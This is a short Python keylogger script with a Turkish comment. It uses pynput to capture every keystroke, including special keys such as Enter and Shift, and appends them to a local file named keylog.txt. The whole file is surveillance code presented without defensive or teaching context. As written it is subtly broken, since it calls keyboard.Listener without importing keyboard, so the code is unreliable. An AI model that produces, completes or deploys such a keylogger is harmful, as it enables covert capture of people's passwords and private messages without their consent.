from pynput.keyboard import Key

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")

    except AttributeError:
        #özel tuşlar(Enter, Shift, vs)

        with open(log_file, "a") as f:
            if key == Key.enter:
                f.write("\n")
            f.write(f"[{key}]")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
